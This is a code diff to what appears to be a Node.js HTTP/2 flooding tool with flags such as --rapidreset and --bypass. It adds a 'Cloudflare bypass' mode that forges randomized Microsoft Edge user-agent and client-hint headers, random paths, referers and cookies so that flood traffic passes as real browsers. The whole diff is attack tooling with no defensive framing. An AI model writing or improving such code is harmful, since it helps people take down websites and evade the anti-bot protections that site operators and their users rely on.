@@ -1,4 +1,3 @@
-const fs = require('fs');
 const cluster = require('cluster');
 const url = require('url');
 const net = require('net');
@@ -189,9 +188,10 @@ const args = {
     tablet: process.argv.includes('--tablet'),
     secua: process.argv.includes('--random') || process.argv.includes('--secua'),
     bypass: process.argv.includes('--bypass'),
-    bfm: process.argv.includes('--bfm') || process.argv.includes('--bypass'),
-    legit: process.argv.includes('--legit') || process.argv.includes('--bypass'),
-    rapidreset: process.argv.includes('--rapidreset') || process.argv.includes('--bypass'),
+    cloudflare: process.argv.includes('--cloudflare'),
+    bfm: process.argv.includes('--bfm'),
+    legit: process.argv.includes('--legit'),
+    rapidreset: process.argv.includes('--rapidreset'),
     httpVersion: process.argv.includes('--http1') ? 1 : 2,
     debug: debugMode,
 
@@ -484,11 +484,60 @@ function generateFirefoxHeaders(parsedTarget, opt = {}) {
 }
 
 // === ENHANCED HEADER GENERATOR ===
+// === EDGE HEADER GENERATOR FOR CLOUDFLARE BYPASS ===
+function generateEdgeHeaders(parsedTarget, opt = {}) {
+    const edgeVersion = Math.floor(Math.random() * 21) + 124;
+    const isAndroid = Math.random() < 0.5;
+    const os = isAndroid ? 'Android' : 'Windows NT 10.0';
+    const platform = isAndroid ? '"Android"' : '"Windows"';
+    const mobile = isAndroid ? '?1' : '?0';
+
+    let brandValue;
+    if (edgeVersion === 126) {
+        brandValue = `"Not_A Brand";v="8", "Chromium";v="${edgeVersion}", "Microsoft Edge";v="${edgeVersion}"`;
+    } else if (edgeVersion === 131) {
+        brandValue = `"Chromium";v="${edgeVersion}", "Not:A-Brand";v="24", "Microsoft Edge";v="${edgeVersion}"`;
+    } else {
+        brandValue = `"Not_A Brand";v="8", "Chromium";v="${edgeVersion}", "Microsoft Edge";v="${edgeVersion}"`;
+    }
+
+    const userAgent = isAndroid ?
+        `Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${edgeVersion}.0.0.0 Mobile Safari/537.36 EdgA/${edgeVersion}.0.0.0` :
+        `Mozilla/5.0 (${os}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${edgeVersion}.0.0.0 Safari/537.36 Edg/${edgeVersion}.0.0.0`;
+
+    const path = opt.randomPath ? randomPaths[Math.floor(Math.random() * randomPaths.length)] : parsedTarget.path || '/';
+
+    const headers = [
+        [':method', opt.method || 'GET'],
+        [':authority', parsedTarget.hostname],
+        [':scheme', parsedTarget.protocol === 'https:' ? 'https' : 'http'],
+        [':path', path],
+        ['user-agent', userAgent],
+        ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'],
+        ['accept-encoding', 'gzip, deflate, br'],
+        ['accept-language', 'en-US,en;q=0.9'],
+        ['sec-ch-ua', brandValue],
+        ['sec-ch-ua-mobile', mobile],
+        ['sec-ch-ua-platform', platform],
+        ['sec-fetch-site', 'none'],
+        ['sec-fetch-mode', 'navigate'],
+        ['sec-fetch-user', '?1'],
+        ['sec-fetch-dest', 'document'],
+        ['upgrade-insecure-requests', '1'],
+        ['sec-ms-gec-version', 'undefined'],
+        ['sec-fetch-users', '?0']
+    ];
+
+    if (opt.randomReferer) headers.push(['referer', referers[Math.floor(Math.random() * referers.length)]]);
+    if (opt.cookies) headers.push(['cookie', generateRandomCookies()]);
+
+    return headers;
+}
+
 function generateEnhancedHeaders(parsedTarget, opt = {}) {
-    if (opt.bypass) {
-        // Use more legitimate Windows headers for bypass mode
-        const browserVersion = Math.floor(Math.random() * 21) + 124;
-        return generateWindowsHeaders(browserVersion, 'Chrome');
+    if (opt.cloudflare) {
+        // Cloudflare bypass mode - use Edge browser headers
+        return generateEdgeHeaders(parsedTarget, opt);
     }
 
     const browserType = Math.floor(Math.random() * 3); // 0: Chrome, 1: Opera, 2: Firefox
